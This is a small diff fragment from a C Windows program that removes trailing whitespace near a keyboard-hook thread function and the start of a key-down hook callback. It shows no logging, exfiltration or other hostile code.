@@ -101,7 +101,7 @@ DWORD WINAPI KeyBoardHookThread(LPVOID lpParam) {
 	}
 	return 0;
 
-} 
+}
 
 LRESULT CALLBACK keyboardHook(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam) {
 	if (nCode == 0 && wParam == 256) {
